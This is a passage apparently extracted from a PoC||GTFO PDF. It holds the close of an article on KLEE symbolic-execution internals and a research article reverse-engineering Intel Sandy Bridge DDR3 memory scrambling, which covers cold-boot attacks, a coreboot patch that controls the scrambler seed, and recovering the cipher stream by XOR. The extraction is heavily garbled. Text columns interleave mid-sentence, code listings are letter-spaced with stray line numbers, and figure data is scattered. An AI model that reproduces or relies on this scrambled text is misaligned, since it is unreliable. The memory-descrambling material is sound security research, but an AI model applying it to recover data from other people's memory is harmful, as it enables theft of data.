• Load/Store: Memory access operations at a
given address
• GetElementPtr: perform array or structure
read/write at certain index
Executor Class
The main class in KLEE is called the
Executor class. It has many methods such as
Executor::run(), which is the main method of
the class. This is where the set of states: added
states and removed states set are manipulated to
decide which state to visit next. Bear in mind that
nothing guarantees that next state in the Executor
class will be the next state in the current path.
Figure 26 shows all of the LLVM instructions
currently supported by KLEE.
• PHI: This corresponds to the PHI function in
the Static Single Assignment form (SSA) as
defined in the literature. 41
There are other instructions I am glossing over but
you can refer to the LLVM reference manual for an
exhaustive list.
So far the execution in KLEE has gone
through
Executor::run() -> Executor::exe-
cuteInstruction() -> case ... but we have
not looked at what these cases actually do in
KLEE. This is handled by a class called the
ExecutionState that is used to represent the state
space.
• Call/Br/Ret:
Control flow instructions.
These are cases where the program counter
(part of the state) may be modified by more
than just the size of the current instruction.
In the case of Call and Ret, a new ob-
ject StackFrame is created where local vari-
ables are bound to the called function and
destroyed on return. Defining new variables
may be achieved through the KLEE API
bindObjectInState().
ExecutionState Class
This class is declared in include/klee/Execution-
State.h and contains mostly two objects:
• AddressSpace: contains the list of all meta-
data for the process objects in this state,
including global, local, and heap objects.
The address space is basically made of an
array of objects and routines to resolve
concrete addresses to objects (via method
AddressSpace::resolveOne to resolve one
by picking up the first match, or method
AddressSpace::resolve for resolving to a
list of objects that may match).
The
AddressSpace object also contains a concrete
store for objects where concrete values can
be read and written to. This is useful when
you’re tracking a symbolic variable but sud-
dently need to concretize it to make an ex-
ternal concrete function call in libc or some
other library that you haven’t linked into your
LLVM module.
• Add/Sub/Mul/*S*/U*/*Or*: The Signed and
Unsigned arithmetic instructions. The usual
suspects including bit shifting operations as
well.
• Cast operations (UItoFP, FPtoUI, IntToPtr,
PtrToInt, BitCast, etc.): used to convert
variables from one type to a variable of a dif-
ferent type.
• *Ext* instructions: these extend a variable to
use a larger number of bits, for example 8b
to 32b, sometimes carrying the sign bit or the
zero bit.
• F* instructions: the floating point arithmetic
instructions in KLEE. I dont myself do much
41 unzip
pocorgtfo18.pdf cytron.pdf
521 $ g r e p −r n i ’ c a s e I n s t r u c t i o n : : ’ l i b / Core /
l i b / Core / E x e c u t o r . cpp : 2 4 5 2 :
case I n s t r u c t i o n : : Ret : {
3 l i b / Core / E x e c u t o r . cpp : 2 5 9 1 :
case I n s t r u c t i o n : : Br : {
l i b / Core / E x e c u t o r . cpp : 2 6 1 9 :
case I n s t r u c t i o n : : S wi tc h : {
5 l i b / Core / E x e c u t o r . cpp : 2 7 3 1 :
case I n s t r u c t i o n : : U n r e a c h a b l e :
l i b / Core / E x e c u t o r . cpp : 2 7 3 9 :
case I n s t r u c t i o n : : I n v o k e :
7 l i b / Core / E x e c u t o r . cpp : 2 7 4 0 :
case I n s t r u c t i o n : : C a l l : {
l i b / Core / E x e c u t o r . cpp : 2 9 8 7 :
case I n s t r u c t i o n : : PHI : {
9 l i b / Core / E x e c u t o r . cpp : 2 9 9 5 :
case I n s t r u c t i o n : : S e l e c t : {
l i b / Core / E x e c u t o r . cpp : 3 0 0 6 :
case I n s t r u c t i o n : : VAArg :
11 l i b / Core / E x e c u t o r . cpp : 3 0 1 2 :
case I n s t r u c t i o n : : Add : {
l i b / Core / E x e c u t o r . cpp : 3 0 1 9 :
case I n s t r u c t i o n : : Sub : {
13 l i b / Core / E x e c u t o r . cpp : 3 0 2 6 :
case I n s t r u c t i o n : : Mul : {
l i b / Core / E x e c u t o r . cpp : 3 0 3 3 :
case I n s t r u c t i o n : : UDiv : {
15 l i b / Core / E x e c u t o r . cpp : 3 0 4 1 :
case I n s t r u c t i o n : : SDiv : {
l i b / Core / E x e c u t o r . cpp : 3 0 4 9 :
case I n s t r u c t i o n : : URem: {
17 l i b / Core / E x e c u t o r . cpp : 3 0 5 7 :
case I n s t r u c t i o n : : SRem : {
l i b / Core / E x e c u t o r . cpp : 3 0 6 5 :
case I n s t r u c t i o n : : And : {
19 l i b / Core / E x e c u t o r . cpp : 3 0 7 3 :
case I n s t r u c t i o n : : Or : {
l i b / Core / E x e c u t o r . cpp : 3 0 8 1 :
case I n s t r u c t i o n : : Xor : {
21 l i b / Core / E x e c u t o r . cpp : 3 0 8 9 :
case I n s t r u c t i o n : : S h l : {
l i b / Core / E x e c u t o r . cpp : 3 0 9 7 :
case I n s t r u c t i o n : : LShr : {
23 l i b / Core / E x e c u t o r . cpp : 3 1 0 5 :
case I n s t r u c t i o n : : AShr : {
l i b / Core / E x e c u t o r . cpp : 3 1 1 5 :
case I n s t r u c t i o n : : ICmp : {
25 l i b / Core / E x e c u t o r . cpp : 3 2 0 7 :
case I n s t r u c t i o n : : A l l o c a : {
l i b / Core / E x e c u t o r . cpp : 3 2 2 1 :
case I n s t r u c t i o n : : Load : {
27 l i b / Core / E x e c u t o r . cpp : 3 2 2 6 :
case I n s t r u c t i o n : : S t o r e : {
l i b / Core / E x e c u t o r . cpp : 3 2 3 4 :
case I n s t r u c t i o n : : GetElementPtr : {
29 l i b / Core / E x e c u t o r . cpp : 3 2 8 9 :
case I n s t r u c t i o n : : Trunc : {
l i b / Core / E x e c u t o r . cpp : 3 2 9 8 :
case I n s t r u c t i o n : : ZExt : {
31 l i b / Core / E x e c u t o r . cpp : 3 3 0 6 :
case I n s t r u c t i o n : : SExt : {
l i b / Core / E x e c u t o r . cpp : 3 3 1 5 :
case I n s t r u c t i o n : : IntToPtr : {
33 l i b / Core / E x e c u t o r . cpp : 3 3 2 4 :
case I n s t r u c t i o n : : PtrToInt : {
l i b / Core / E x e c u t o r . cpp : 3 3 3 4 :
case I n s t r u c t i o n : : B i t C a s t : {
35 l i b / Core / E x e c u t o r . cpp : 3 3 4 3 :
case I n s t r u c t i o n : : FAdd : {
l i b / Core / E x e c u t o r . cpp : 3 3 5 8 :
case I n s t r u c t i o n : : FSub : {
37 l i b / Core / E x e c u t o r . cpp : 3 3 7 2 :
case I n s t r u c t i o n : : FMul : {
l i b / Core / E x e c u t o r . cpp : 3 3 8 7 :
case I n s t r u c t i o n : : FDiv : {
39 l i b / Core / E x e c u t o r . cpp : 3 4 0 2 :
case I n s t r u c t i o n : : FRem : {
l i b / Core / E x e c u t o r . cpp : 3 4 1 7 :
case I n s t r u c t i o n : : FPTrunc : {
41 l i b / Core / E x e c u t o r . cpp : 3 4 3 4 :
case I n s t r u c t i o n : : FPExt : {
l i b / Core / E x e c u t o r . cpp : 3 4 5 0 :
case I n s t r u c t i o n : : FPToUI : {
43 l i b / Core / E x e c u t o r . cpp : 3 4 6 7 :
case I n s t r u c t i o n : : FPToSI : {
l i b / Core / E x e c u t o r . cpp : 3 4 8 4 :
case I n s t r u c t i o n : : UIToFP : {
45 l i b / Core / E x e c u t o r . cpp : 3 5 0 0 :
case I n s t r u c t i o n : : SIToFP : {
l i b / Core / E x e c u t o r . cpp : 3 5 1 6 :
case I n s t r u c t i o n : : FCmp: {
47 l i b / Core / E x e c u t o r . cpp : 3 6 0 8 : case I n s t r u c t i o n : : I n s e r t V a l u e : {
l i b / Core / E x e c u t o r . cpp : 3 6 3 5 : case I n s t r u c t i o n : : E x t r a c t V a l u e : {
49 l i b / Core / E x e c u t o r . cpp : 3 6 4 5 :
case I n s t r u c t i o n : : Fence : {
l i b / Core / E x e c u t o r . cpp : 3 6 4 9 :
case I n s t r u c t i o n : : I n s e r t E l e m e n t : {
51 l i b / Core / E x e c u t o r . cpp : 3 6 9 1 :
case I n s t r u c t i o n : : E x t r a c t E l e m e n t : {
l i b / Core / E x e c u t o r . cpp : 3 7 2 4 :
case I n s t r u c t i o n : : S h u f f l e V e c t o r :
Figure 26. LLVM Instructions supported by KLEE
53• ConstraintManager: contains the list of all
symbolic constraints available in this state. By
default, KLEE stores all path conditions in the
constraint manager for that state, but it can
also be used to add more constraints of your
choice. Not all objects in the AddressSpace
may be subject to constraints, which is left to
the discretion of the KLEE programmer. Ver-
ifying that these constraints are satisfiable can
be done by calling solver->mustBeTrue() or
solver->MayBeTrue() methods, which is a
solver-independent API provided in KLEE to
call SMT or Z3 independently of the low-level
solver API. This comes handy when you want
to check the feasibility of certain variable val-
ues during analysis.
Using these methods, checking for boundary con-
ditions is child’s play. It becomes more interesting
when symbolics are used as the conditions that must
be checked involves more than constants, depending
on whether the base address, the offset or the index
are symbolic values (or possibly depending on the
source data for certain analyses, for example taint
analysis).
While the MemoryObject somehow takes care of
the spatial integrity of the object, the ObjectState
class is used to access the memory value itself in the
state. Its most useful methods are:
// r e t u r n b y t e s r e a d .
r e f <Expr> r e a d ( r e f <Expr> o f f s e t ,
Expr : : Width width ) ;
r e f <Expr> r e a d ( unsigned o f f s e t ,
Expr : : Width width ) ;
r e f <Expr> r e a d 8 ( unsigned o f f s e t ) ;
Every time the ::fork() method is called,
one execution state is split into two where pos-
sibly more constraints or different values have
been inserted in these objects. One may call the
Executor::branch() method directly to create a
new state from the existing state without creating
a state pair as fork would do. This is useful when
you only want to add a subcase without following
the exact fork expectations.
// r e t u r n b y t e s w r i t t e n .
void w r i t e ( unsigned o f f s e t ,
r e f <Expr> v a l u e ) ;
void w r i t e ( r e f <Expr> o f f s e t ,
r e f <Expr> v a l u e ) ;
void w r i t e 8 ( unsigned o f f s e t ,
uint8_t value ) ;
void w r i t e 1 6 ( unsigned o f f s e t ,
uint16_t value ) ;
void w r i t e 3 2 ( unsigned o f f s e t ,
uint32_t value ) ;
void w r i t e 6 4 ( unsigned o f f s e t ,
uint64_t value ) ;
Executor::executeMemoryOperation(),
MemoryObject and ObjectState
Two important classes in KLEE are MemoryObject
and ObjectState, both defined in lib/klee/-
Core/Memory.h.
The MemoryObject class is used to represent
an object such as a buffer that has a base ad-
dress and a size. When accessing such an object,
typically via the Executor::executeMemoryOper-
ation() method, KLEE automatically ensures that
accesses are in bound based on known base address,
desired offset, and object size information. The
MemoryObject class provides a few handy methods:
Objects can be either concrete or symbolic, and
these methods implement actions to read or write
the object depending on this state. One can switch
from concrete to symbolic state by using methods:
void makeConcrete ( ) ;
void makeSymbolic ( ) ;
These methods will just flush symbolics if we
become concrete, or mark all concrete variables as
symbolics from now on if we switch to symbolic
mode. Its good to play around with these meth-
ods to see what happens when you write the value
of a variable, or make a new variable symbolic and
so on.
When Instruction::Load and ::Store are
encountered,
the Executor::executeMemory-
Operation() method is called where symbolic
array bounds checking is implemented.
This
implementation uses a mix of MemoryObject,
ObjectState, AddressSpace::resolveOne() and
(...)
r e f <ConstantExpr> getBaseExpr ( )
r e f <ConstantExpr> g e t S i z e E x p r ( )
r e f <Expr> g e t O f f s e t E x p r ( r e f <Expr> p o i n t e r )
r e f <Expr> g et B o u n ds C h e ck P o i nt e r (
r e f <Expr> p o i n t e r )
r e f <Expr> g et B o u n ds C h e ck P o i nt e r (
r e f <Expr> p o i n t e r , unsigned b y t e s )
r e f <Expr> g e t B o u n d s C h e c k O f f s e t (
r e f <Expr> o f f s e t )
r e f <Expr> g e t B o u n d s C h e c k O f f s e t (
r e f <Expr> o f f s e t , unsigned b y t e s )
54MemoryObject::getBoundsCheckOffset() to fig-
ure out whether any overflow condition can happen.
If so, it calls KLEE’s internal API Executor::-
terminateStateOnError() to signal the memory
safety issue and terminate the current state. Sym-
bolic execution will then resume on other states so
that KLEE does not stop after the first bug it finds.
As it finds more errors, KLEE saves the error lo-
cations so it won’t report the same bugs over and
over.
into visible assertions. KLEE does not make much
use of these stubs and mostly generate a warning if
you reach one of the ASan-defined stubs.
Other recent additions were klee_open_merge()
and klee_close_merge() that are an annotation
mechanism to perform selected merging in KLEE.
Merging happens when you come back from a con-
ditional contruct (e.g., switch, or when you must
define whether to continue or break from a loop) as
you must select which constraints and values will
hold in the state immediately following the merge.
KLEE has some interesting merging logic imple-
mented in lib/Core/MergeHandler.cpp that are
worth taking a look at.
Special Function Handlers
A bunch of special functions are defined in KLEE
that have special handlers and are not treated
as normal functions. See lib/Core/SpecialFun-
ctionHandler.cpp.
Some of these special functions are called from
the Executor::executeInstruction() method in
the case of the Instruction::Call instruction.
All the klee_* functions are internal KLEE
functions which may have been produced by anno-
tations given by the KLEE analyst. (For example,
you can add a klee_assume(p) somewhere in the
analyzed program’s code to say that p is assumed
to be true, thereby some constraints will be pushed
into the ConstraintManager of the currenet state
without checking them.) Other functions such as
malloc, free, etc. are not treated as normal function
in KLEE. Because the malloc size could be sym-
bolic, KLEE needs to concretize the size according
to a few simplistic criteria (like size = 0, size =
2 8 , size = 2 16 , etc.) to continue making progress.
Suffice to say this is quite approximate.
This
logic
is
implemented
in
the
Executor::executeAlloc() and ::executeFree()
methods. I have hacked around some modifications
to track the heap more precisely in KLEE, how-
ever bear in mind that KLEE’s heap as well as the
target program’s heap are both maintained within
the same address space, which is extremely intru-
sive. This makes KLEE a bad framework for layout
sensitive analysis, which many exploit generation
problems require nowadays. Other special functions
include stubs for Address Sanitizer (ASan), which
is now included in LLVM and can be enabled while
creating LLVM code with clang. ASan is mostly use-
ful for fuzzing so normally invisible corruptions turn
Experiment with KLEE for yourself !
I did not go much into details of how to install KLEE
as good instructions are available onine. 42 Try it for
yourself!
I personally use LLVM 3.4 mostly but KLEE also
supports LLVM 3.5 reliably, although as far as I
know 3.4 is still recommended.
My setup is an amd64 machine on Ubuntu 16.04
that has most of what you will need in packages. I
recommend building LLVM and KLEE from sources
as well as all dependencies (e.g., Z3 43 and/or STP 44 )
that will help you avoid weird symbol errors in your
experiments.
A good first target to try KLEE on is coreutils,
which is what prettty much everybody uses in their
research papers evaluation nowadays. Coreutils is
well tested so new bugs in it are scarce, but its good
to confirm everything works okay for you. A tuto-
rial on how to run KLEE on coreutils is available as
part of the project website. 45
I personally used KLEE on various targets: core-
utils, busybox, as well as other standard network
tools that take input from untrusted data. These
will require a standalone research paper explaining
how KLEE can be used to tackle these targets.
42 http://klee.github.io/build-llvm34/
43 unzip
pocorgtfo18.pdf z3.pdf
pocorgtfo18.pdf stp.pdf
45 http://klee.github.io/docs/coreutils-experiments/
44 unzip
55$ g r e p −i n add \ ( l i b / Core / S p e c i a l F u n c t i o n H a n d l e r . cpp
2 66:# d e f i n e add ( name , h a n d l e r , r e t ) { name , \
8 1 : add ( " c a l l o c " , h a n d l e C a l l o c , t r u e ) ,
4 8 2 : add ( " f r e e " , h a n d l e F r e e , f a l s e ) ,
8 3 : add ( " klee_assume " , handleAssume , f a l s e ) ,
6 8 4 : add ( " klee_check_memory_access " , handleCheckMemoryAccess , f a l s e ) ,
8 5 : add ( " k l e e _ g e t _ v a l u e f " , handleGetValue , t r u e ) ,
8 8 6 : add ( " k l e e _ g e t _ v a l u e d " , handleGetValue , t r u e ) ,
8 7 : add ( " k l e e _ g e t _ v a l u e l " , handleGetValue , t r u e ) ,
10 8 8 : add ( " k l e e _ g e t _ v a l u e l l " , handleGetValue , t r u e ) ,
8 9 : add ( " k l e e _ g e t _ v a l u e _ i 3 2 " , handleGetValue , t r u e ) ,
12 9 0 : add ( " k l e e _ g e t _ v a l u e _ i 6 4 " , handleGetValue , t r u e ) ,
9 1 : add ( " k l e e _ d e f i n e _ f i x e d _ o b j e c t " , h a n d l e D e f i n e F i x e d O b j e c t , f a l s e ) ,
14 9 2 : add ( " k l e e _ g e t _ o b j _ s i z e " , h a n d l e G e t O b j S i z e , t r u e ) ,
9 3 : add ( " k l e e _ g e t _ e r r n o " , handleGetErrno , t r u e ) ,
16 9 4 : add ( " k l e e _ i s _ s y m b o l i c " , h a n d l e I s S y m b o l i c , t r u e ) ,
9 5 : add ( " klee_make_symbolic " , handleMakeSymbolic , f a l s e ) ,
18 9 6 : add ( " klee_mark_global " , handleMarkGlobal , f a l s e ) ,
9 7 : add ( " klee_open_merge " , handleOpenMerge , f a l s e ) ,
20 9 8 : add ( " k l e e _ c l o s e _ m e r g e " , handleCloseMerge , f a l s e ) ,
9 9 : add ( " k l e e _ p r e f e r _ c e x " , h a n d l e P r e f e r C e x , f a l s e ) ,
22 1 0 0 : add ( " k l e e _ p o s i x _ p r e f e r _ c e x " , h a n d l e P o s i x P r e f e r C e x , f a l s e ) ,
1 0 1 : add ( " k l e e _ p r i n t _ e x p r " , h a n d l e P r i n t E x p r , f a l s e ) ,
24 1 0 2 : add ( " k l e e _ p r i n t _ r a n g e " , han dl ePr int Ran ge , f a l s e ) ,
1 0 3 : add ( " k l e e _ s e t _ f o r k i n g " , h a n d l e S e t F o r k i n g , f a l s e ) ,
26 1 0 4 : add ( " k l e e _ s t a c k _ t r a c e " , h a n d l e S t a c k T r a c e , f a l s e ) ,
1 0 5 : add ( " k l e e _ w a r n i n g " , handleWarning , f a l s e ) ,
28 1 0 6 : add ( " klee_warning_once " , handleWarningOnce , f a l s e ) ,
1 0 7 : add ( " k l e e _ a l i a s _ f u n c t i o n " , h a n d l e A l i a s F u n c t i o n , f a l s e ) ,
30 1 0 8 : add ( " m a l l o c " , h a n d l e M a l l o c , t r u e ) ,
1 0 9 : add ( " r e a l l o c " , h a n d l e R e a l l o c , t r u e ) ,
32 1 1 2 : add ( " x m a l l o c " , h a n d l e M a l l o c , t r u e ) ,
1 1 3 : add ( " x r e a l l o c " , h a n d l e R e a l l o c , t r u e ) ,
34 1 1 6 : add ( "_ZdaPv" , h a n d l e D e l e t e A r r a y , f a l s e ) ,
1 1 8 : add ( "_ZdlPv" , h a n d l e D e l e t e , f a l s e ) ,
36 1 2 1 : add ( "_Znaj" , handleNewArray , t r u e ) ,
1 2 3 : add ( "_Znwj" , handleNew , t r u e ) ,
38 1 2 8 : add ( "_Znam" , handleNewArray , t r u e ) ,
1 3 0 : add ( "_Znwm" , handleNew , t r u e ) ,
40 1 3 4 : add ( " __ubsan_handle_add_overflow " , handleAddOverflow , f a l s e ) ,
1 3 5 : add ( " __ubsan_handle_sub_overflow " , handleSubOverflow , f a l s e ) ,
42 1 3 6 : add ( " __ubsan_handle_mul_overflow " , handleMulOverflow , f a l s e ) ,
1 3 7 : add ( " __ubsan_handle_divrem_overflow " , handleDivRemOverflow , f a l s e ) ,
44 j v a n e g u e @ l l v m l a b 1 : ~ / h k l e e $
Figure 27. KLEE Special Function Handlers
56Symbolic Heap Execution in KLEE
For heap analysis, it appears that KLEE has a
strong limitation of where heap chunks for KLEE
as well as for the target program are maintained
in the same address space. One would need to in-
troduce an allocator proxy 46 if we wanted to track
any kind of heap layout fidelity for heap prediction
purpose. There are spatial issues to consider there
as symbolic heap size may lead to heap state space
explosion, so more refined heap management may
be required. It may be that other tools relying on
selective symbolic execution (S2E) 47 may be more
suitable for some of these problems.
Analyzing Distributed Applications.
These are more complex use-cases where KLEE
must be modified to track state across distributed
component. 48 Several industrially-sized programs
use databases and key-value stores and it is inter-
esting to see what symbolic execution model can be
defined for those. This approach has been applied
to distributed sensor networks and could also be ex-
perimented on distributed software in the cloud.
You can either obtain LLVM code by compiling
with the clang compiler (3.4 for KLEE) or use a
decompiler like McSema 49 and its ReMill library.
There are enough success stories to validate sym-
bolic execution as a practical technology; I encour-
age you to come up with your own experiments, to
figure out what is missing in KLEE to make it work
for you. Getting familiar with every corner cases of
KLEE can be very time consuming, so an approach
of “least modification” is typically what I follow.
Beware of restricting yourself to artificial test
suites as, beyond their likeness to real world code,
they do not take into account all the environmental
dependencies that a real project might have. A typ-
ical example is that KLEE does not support inline
assembly. Another is the heap intrusiveness previ-
ously mentioned. These limitations might turn a
golden technique like symbolic execution into a vac-
uous technology if applied to a bad target.
I leave you to that. Have fun and enjoy!
—Julien
46 unzip
pocorgtfo18.pdf nextgendebuggers.pdf
pocorgtfo18.pdf s2e.pdf
48 unzip pocorgtfo18.pdf kleenet.pdf
49 git clone https://github.com/trailofbits/mcsema
47 unzip
5718:09
Memory Scrambling on Intel Sandy Bridge DDR3
by Nico Heijningen
Humble greetings neighbors,
Scrambled data
Data
I reverse engineered part of the memory scram-
bling included in Intel’s Sandy/Ivy Bridge proces-
sors. I have distilled my research in a PoC that can
reproduce all 2 18 possible 1,024 byte scrambler se-
quences from a 1,026 bit starting state. 50
State
1
For a while now Intel’s memory controllers in-
clude memory scrambling functionality. Intel’s doc-
umentation explains the benefits of scrambling the
data before it is written to memory for reduc-
ing power spikes and parasitic coupling. 51 Prior
research on the topic 52 53 quotes different Intel
patents. 54
0
1
0
Output bits / PRBS
Feedback bit
An analysis of the properties of the cipher stream
has to our knowledge never been performed. Here
I will describe my journey in obtaining the cipher
stream and analyzing it.
First we set out to reproduce the work of Bauer
et al.: by performing a cold-boot attack we were
able to obtain a copy of memory. However, because
this is quite a tedious procedure, it is troublesome
to profile different scrambler settings. Bauer’s work
is built on ‘differential’ scrambler images: scram-
bled with one SCRMSEED and descrambled with
another. The data obtained by using the procedure
of Bauer et al. contains some artifacts because of
this.
We found that it is possible to disable the mem-
ory scrambler using an undocumented Intel register
and used coreboot to set it early in the boot pro-
cess. We patched coreboot to try and automate
the process of profiling the scrambler. We chose
the Sandy Bride platform as both Bauer et al.’s
work was based on it and because coreboot’s mem-
ory initialization code has been reverse engineered
for the platform. 57 Although coreboot builds out-
of-the-box for the Gigabyte GA-B75M-D3V moth-
erboard we used, coreboot’s makefile ecosystem is
quite something to wrap your head around. The
code contains some lines dedicated to the memory
scrambler, setting the scrambling seed or SCRM-
SEED. I patched the code in Figure 28 to disable the
Furthermore, some details can be deduced by
cross-referencing datasheets of other architectures 55 ,
for example the scrambler is initialized with a ran-
dom 18 bit seed on every boot; the SCRMSEED.
Other than this nothing is publicly known or docu-
mented by Intel. The prior work shows that scram-
bled memory can be descrambled, yet newer versions
of the scrambler seem to raise the bar, together with
prospects of full memory encryption. 56 While the
scrambler has never been claimed to provide any
cryptographic security, it is still nice to know how
the scrambling mechanism works.
Not much is known as to the internals of the
memory scrambler, Intel’s patents discuss the use
of LFSRs and the work of Bauer et al. has mod-
eled the scrambler as a stream cipher with a short
period. Hence the possibility of a plaintext attack
to recover scrambled data: if you know part of the
memory content you can obtain the cipher stream by
XORing the scrambled memory with the plaintext.
Once you know the cipher stream you can repeti-
tively XOR this with the scrambled data to obtain
the original unscrambled data.
50 unzip
pocorgtfo18.pdf IntelMemoryScrambler.zip
for example Intel’s 3rd generation processor family datasheet section 2.1.6 Data Scrambling.
52 Johannes Bauer, Michael Gruhn, and Felix C. Freiling. “Lest we forget: Cold-boot attacks on scrambled DDR3 memory.”
In: Digital Investigation 16 (2016), S65–S74.
53 Yitbarek, Salessawi Ferede, et al. “Cold Boot Attacks are Still Hot: Security Analysis of Memory Scramblers in Modern
Processors.” High Performance Computer Architecture (HPCA), 2017 IEEE International Symposium on. IEEE, 2017.
54 USA Patents 7945050, 8503678, and 9792246.
55 See 24.1.45 DSCRMSEED of N-series Intel R Pentium R Processors and Intel R Celeron R Processors Datasheet – Volume
2 of 3, February 2016
56 Both Intel and AMD have introduced their flavor of memory encryption.
57 For most platforms the memory initialization code is only available as an blob from Intel.
51 See
583784 s t a t i c void s e t _ s c r a m b l i n g _ s e e d ( ramctr_timing ∗ c t r l )
{
3786
int channel ;
3788
/∗ FIXME: we h a r d c o d e s e e d s . Do we need t o u s e some PRNG f o r them?
I don ’ t t h i n k so . ∗/
s t a t i c u32 s e e d s [NUM_CHANNELS] [ 3 ] = {
{0 x00009a36 , 0 x b a f c f d c f , 0 x46d1ab68 } ,
{0 x00028bfa , 0 x 5 3 f e 4 b 4 9 , 0 x19ed5483 }
};
FOR_ALL_POPULATED_CHANNELS {
MCHBAR32( 0 x4020 + 0 x400 ∗ c h a n n e l ) &= ~0 x10000000 ;
w r i t e 3 2 (DEFAULT_MCHBAR + 0 x4034 , s e e d s [ c h a n n e l ] [ 0 ] ) ;
w r i t e 3 2 (DEFAULT_MCHBAR + 0 x403c , s e e d s [ c h a n n e l ] [ 1 ] ) ;
w r i t e 3 2 (DEFAULT_MCHBAR + 0 x4038 , s e e d s [ c h a n n e l ] [ 2 ] ) ;
}
3790
3792
3794
3796
3798
3800 }
Figure 28. Coreboot’s Scrambling Seed for Sandy Bridge
It is interesting to note that a feedback bit is
being shifted in on every clocktick. Typically only
the bit being shifted out of the LFSR would be used
as part of the ‘random’ cipher stream being gener-
ated, instead of the LFSR’s complete internal state.
The latter no longer produces a random stream of
data, the consequences of this are not known but it
is probably done for performance optimization.
These properties could suggest multiple con-
structions. For example, layered LFSRs where one
LFSR generates the next LFSR’s starting state, and
part of the latter’s internal state being used as out-
put. However, the actual construction is unknown.
The number of combined LFSRs is not known, nei-
ther is their polynomial (positions of the feedback
taps), nor their length, nor the manner in which
they’re combined.
Normally it would be possible to deduce such
information by choosing a typical length, e.g. 16-
bit, LFSR and applying the Berlekamp Massey al-
gorithm. The algorithm uses the first 16-bits in the
cipher stream and deduces which polynomials could
possibly produce the next bits in the cipher stream.
However, because of the previously described un-
knowns this leads us to a dead end. Back to the
drawing board!
Automating the cipher stream acquisition by
also patching coreboot to parse input from the serial
console we were able to dynamically set the SCRM-
SEED, then obtain the cipher stream. Writing a
Python script to control the PC via a serial cable en-
abled us to iterate all 2 18 possible SCRMSEEDs and
memory scrambler, write all zeroes to memory, reset
the machine, enable the memory scrambler with a
specific SCRMSEED, and print a specific memory
region to the debug console. (COM port.) This way
we are able to obtain the cipher stream for differ-
ent SCRMSEEDs. For example when writing eight
bytes of zeroes to the memory address starting at
0x10000070 with the scrambler disabled, we read 3A
E0 9D 70 4E B8 27 5C back from the same address
once the PC is reset and the scrambler is enabled.
We know that that’s the cipher stream for that mem-
ory region. A reset is required as the SCRMSEED
can no longer be changed nor the scrambler disabled
after memory initialization has finished. (Registers
need to be locked before the memory can be initial-
ized.)
Now some leads by Bauer et al. based on the
Intel patents quickly led us in the direction of ana-
lyzing the cipher stream as if it were the output of
an LFSR. However, taking a look at any one of the
cipher stream reveals a rather distinctive usage of
a LFSR. It seems as if the complete internal state
of the LFSR is used as the cipher stream for three
shifts, after which the internal state is reset into a
fresh starting state and shifted three times again.
(See Figure 29.)
00111010
10011101
01001110
00100111
11100000
01110000
10111000
01011100
5906
86
D6
3A
38
5A
D8
E0
83
C3
EB
9D
1C
2D
6C
70
C1
61
75
4E
8E
96
B6
B8
60
30
3A
27
C7
CB
DB
5C
E2
E1
50
37
20
68
F2
80
F1
70
28
1B
10
B4
79
C0
F8
B8
94
0D
88
5A
3C
E0
7C
5C
4A
06
44
2D
1E
F0
LFSR stretch
00111010 11100000 10011101 01110000 01001110 10111000 00100111 01011100
Figure 29. Keyblock
save their accompanying 1024 byte cipher streams.
Acquiring all cipher streams took almost a full week.
This data now allowed us to try and find relations
between the SCRMSEED and the produced cipher
stream. Stated differently, is it possible to reproduce
the scrambler’s working by using less than 2 18 ×1024
bytes?
This analysis was eased once we stumbled upon
a patent describing the use of the memory bus
as a high speed interconnect, under the name of
TeraDIMM. 58 Using the memory bus as such, one
would only receive scrambled data on the other end,
hence the data needs to be descrambled. The au-
thors give away some of their knowledge on the sub-
ject: the cipher stream can be built from XORing
specific regions of the stream together. This insight
paved the way for our research into the memory
scrambling.
The main distinction that the TeraDIMM patent
makes is the scrambling applied is based on four
bits of the memory address versus the scrambling
based on the (18-bit) SCRMSEED. Both the mem-
ory address- and SCRMSEED-based scrambling are
used to generate the cipher stream 64 byte blocks
at a time. 59 Each 64 byte cipher-stream-block is a
(linear) combination of different blocks of data that
are selected with respect to the bits of the memory
address. See Figure 30.
Because the address-based scrambling does not
depend on the SCRMSEED, this is canceled out in
the differential images obtained by Bauer. This is
how far the TeraDIMM patent takes us; however,
with this and our data in mind it was easy to see
that the SCRMSEED based scrambling is also built
up by XORing blocks together. Again depending on
the bits of the SCRMSEED set, different blocks are
58 US
XORed together.
Hence, to reproduce any possible cipher stream
we only need four such blocks for the address scram-
bling, and eighteen blocks for the SCRMSEED
scrambling. We have named the eighteen SCRM-
SEEDs that produce the latter blocks the (SCRM-
SEED) toggleseeds. We’ll leave the four address
scrambling blocks for now and focus on the toggle-
seeds.
The next step in distilling the redundancy in the
cipher stream is to exploit the observation that for
specific toggleseeds parts of the 64 byte blocks over-
lap in a sequential manner. (See Figure 32.) The
18 toggleseeds can be placed in four groups and any
block of data associated with the toggleseeds can be
reproduced by picking a different offset in the non-
redundant stream of one of the four groups. Go-
ing back from the overlapping stream to the cipher
stream of SCRMSEED 0x100 we start at an offset
of 16 bytes and take 64 bytes, obtaining 00 30 80
... 87 b7 c3.
Patent 8713379.
is the largest amount of data that can be burst over the DDR3 bus.
59 This
60Figure 30. TeraDIMM Scrambling

overlappingstream( z )


























0000 1100 0000
0000 0110 0000
0000 0011 0000
0000 0001 1000
0000 0000 1100
0000 0000 0110
0000 0000 0011
0001 0000 0011
0001 1000 0011
0001 1100 0011
0001 1110 0011
0001 1111 0011
 
 
 
 
 
 
 
 
 
 
 
 
 
 • 
 
 
 
 
 
 
 
 
 
 
 
 
 
stretch 0

Finally, the overlapping streams of two of the
four groups can be used to define the other two;
by combining specific eight byte stretches i.e., mul-
tiplying the stream with a static matrix. For ex-
ample, to obtain the first stretch of the overlapping
stream of SCRMSEEDs 0x4, 0x10, 0x100, 0x1000,
and 0x10000 we combine the fifth and the sixth
stretch of the overlapping stream of SCRMSEEDs
0x1, 0x40, 0x400, and 0x4000. That is 20 00
10 00 08 00 04 00 = 00 01 00 00 00 00 00 00
ˆ 20 01 10 00 08 00 04 00. The matrix is the
same between the two groups and provided in Fig-
ure 31. One is invited to verify the correctness of
that figure using Figure 32.
Some future work remains to be done. We pos-
tulate the existence of a mathematical basis to these
observations, but a nice mathematical relationship
underpinning the observations is yet to be found.
Any additional details can be found in my TUE the-
sis. 60

stretch 1 


stretch 2 

stretch 3 


stretch 4 


stretch 5 

stretch 6 


stretch 7 

stretch 8 


stretch 9 


stretch 10 
stretch 11
Figure 31. Scrambler Matrix
60 unzip
pocorgtfo18.pdf heijningen-thesis.pdf
6162
0c
SCRMSEEDS
SCRMSEED=0x4000
1c
99
67
c3
